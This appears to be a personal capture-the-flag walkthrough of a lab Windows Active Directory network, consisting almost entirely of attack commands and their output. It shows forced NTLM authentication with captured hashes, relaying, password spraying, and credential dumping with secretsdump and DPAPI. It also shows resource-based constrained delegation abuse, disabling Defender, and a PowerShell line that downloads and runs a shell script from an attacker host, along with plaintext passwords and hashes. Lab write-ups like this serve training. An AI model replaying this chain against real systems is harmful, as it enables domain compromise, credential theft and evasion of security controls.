 Scan
```sh
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-27 13:55:52Z)
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time:
|   date: 2024-08-27T13:55:56
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
```
MS01
```sh
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-08-27T13:57:42+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=ms01.reflection.vl
| Not valid before: 2024-08-26T13:54:12
|_Not valid after:  2025-02-25T13:54:12
| rdp-ntlm-info:
|   Target_Name: REFLECTION
|   NetBIOS_Domain_Name: REFLECTION
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: reflection.vl
|   DNS_Computer_Name: ms01.reflection.vl
|   DNS_Tree_Name: reflection.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-08-27T13:57:36+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
49668/tcp open  unknown
49675/tcp open  unknown
```

WS01 
```sh
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-08-27T13:59:06+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=ws01.reflection.vl
| Not valid before: 2024-08-26T13:56:51
|_Not valid after:  2025-02-25T13:56:51
| rdp-ntlm-info:
|   Target_Name: REFLECTION
|   NetBIOS_Domain_Name: REFLECTION
|   NetBIOS_Computer_Name: WS01
|   DNS_Domain_Name: reflection.vl
|   DNS_Computer_Name: ws01.reflection.vl
|   DNS_Tree_Name: reflection.vl
|   Product_Version: 10.0.19041
|_  System_Time: 2024-08-27T13:58:26+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time:
|   date: 2024-08-27T13:58:29
|_  start_date: N/A
| smb2-security-mode:
|   311:

```

Enum : 
```sh
netexec smb $t2 -u "Guest" -p "" --shares
smbclient \\\\$t2\\staging -U reflection.vl/Guest
```

Creds :
```sh
user=web_staging
password=Washroom510
db=staging#
```

Sql : 
```sh
mssqlclient.py reflection/web_staging:Washroom510@$t2
```

New creds  :
```sh
id   username   password
--   --------   -------------
 1   b'dev01'   b'Initial123'

 2   b'dev02'   b'Initial123'
```

Catch hash : 
```sh
EXEC master.sys.xp_dirtree '\\10.8.3.12\myshare',1,1
responder --interface "tun0" -wd
```

hash:
```
[SMB] NTLMv2-SSP Client   : 10.10.231.70
[SMB] NTLMv2-SSP Username : REFLECTION\svc_web_staging
[SMB] NTLMv2-SSP Hash     : svc_web_staging::REFLECTION:1122334455667788:E571FE0EBECB9CB8DB559D27EBE656EB:0101000000000000003D84A55EF9DA019EA269D8030FBA090000000002000800430053003900500001001E00570049004E002D0048004D0031004A004A00430044004B00530030004A0004003400570049004E002D0048004D0031004A004A00430044004B00530030004A002E0043005300390050002E004C004F00430041004C000300140043005300390050002E004C004F00430041004C000500140043005300390050002E004C004F00430041004C0007000800003D84A55EF9DA010600040002000000080030003000000000000000000000000030000027C118CC925121058025F73FFB610BAD0E485878B21AE520900B1841F0D366EC0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0033002E00310032000000000000000000
```

```sh
ntlmrelayx.py -tf host -smb2support -socks
proxychains smbclient.py //10.10.231.71 -U REFLECTION/SVC_WEB_STAGING
proxychains smbclient.py 'reflection'/SVC_WEB_STAGING@10.10.211.230
#or
ntlmrelayx.py -tf host -smb2support -i
nc 127.0.0.1 11000

```

New creds : 
```sh
user=web_prod
password=Tribesman201
db=prod
```

```sh
proxychains -q nxc smb 10.10.231.69 -u SVC_WEB_STAGING -d REFLECTION -p "" --rid-brute | grep '\\' | cut -d $'\\' -f2 | cut -d ' ' -f1 | tee -a users_rid.txt

netexec smb 10.10.231.69 10.10.231.71 10.10.231.70 -u users_rid.txt -p "Tribesman201" --no-bruteforce --continue-on-success

mssqlclient.py reflection/web_prod:Tribesman201@$t1
EXEC master.sys.xp_dirtree '\\10.8.3.12\myshare',1,1

 1   b'abbie.smith'   b'CMe1x+nlRaaWEw'
 2   b'dorothy.rose'  b'hC_fny3OK9glSJ'
```

- New hash : 
```sh
svc_web_prod::REFLECTION:1122334455667788:295501EFF7AD61355C78FF22D9829E72:010100000000000000608A0DFFF9DA01CB89B8936F2120F300000000020008004A005A004B00550001001E00570049004E002D0047005400590056004400530045004F0043004A00360004003400570049004E002D0047005400590056004400530045004F0043004A0036002E004A005A004B0055002E004C004F00430041004C00030014004A005A004B0055002E004C004F00430041004C00050014004A005A004B0055002E004C004F00430041004C000700080000608A0DFFF9DA0106000400020000000800300030000000000000000000000000300000B0270D3322128C9BC7D2F3E0AA6C18EC8D3C58D513D3B9C3B59E6B274E4D01DF0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0033002E00310032000000000000000000
```

- Enum : 
```sh
bloodhound-python -d 'reflection.vl' -u 'dorothy.rose' -p 'hC_fny3OK9glSJ' -ns 10.10.211.230 -dc reflection.vl -c all
```

- Foothold :
```sh
netexec smb 10.10.211.230 -u abbie.smith -p "CMe1x+nlRaaWEw" --laps
evil-winrm -i 10.10.212.150 -u "Administrator" -p "H447.++h6g5}xi"
```

Machine 1 VL{0d0a7b68ddc98dba0a3eb5e9b8a409ff}

Dumping creds :
```sh
netexec smb 10.10.212.150 -u "Administrator" -p "H447.++h6g5}xi" --dpapi --local-auth
secretsdump 'ms01/administrator:H447.++h6g5}xi@10.10.234.54'

REFLECTION\Georgia.Price:DBl+5MPkpJg5id
```

RBCD : 
```sh
# Read the attribute
rbcd.py -delegate-to 'ws01$' -dc-ip 'dc$' -action 'read' 'reflection.vl'/'Georgia.Price':'DBl+5MPkpJg5id'

# Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity
rbcd.py -delegate-from 'ms01$' -delegate-to 'ws01$' -dc-ip '$dc' -action 'write' 'reflection.vl'/'Georgia.Price':'DBl+5MPkpJg5id'

getST.py -spn 'cifs/ws01.reflection.vl' -impersonate Administrator -dc-ip '$DC' 'REFLECTION.VL/MS01$' -hashes :c1658a71853a7f23f7ff13cd1c7ee10a

export KRB5CCNAME=Administrator.ccache
nxc smb 10.10.202.39 --use-kcache --lsa --sam --dpapi

```

- Foothold : 
```sh
atexec.py -hashes ':a29542cb2707bf6d6c1d2c9311b0ff02' 'ws01'/'Administrator'@'10.10.202.39' whoami

nxc smb 10.10.202.39 --use-kcache -x "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"
nxc smb 10.10.202.39 --use-kcache -x "powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://10.8.3.12:8080/shell.ps1')"

password: knh1gJ8Xmeq+uP #password spraying
```

- New creds : 
```sh
Rhys.Garner : knh1gJ8Xmeq+uP
nxc ldap 10.10.202.37 -u Rhys.Garner -p knh1gJ8Xmeq+uP --bloodhound --collection All -ns 10.10.202.37
```

- Password spraying : 
```sh
Admin --> dom_rgarner : knh1gJ8Xmeq+uP
````

Root : VL{050ec757b24206dec5731c0f7c183d17}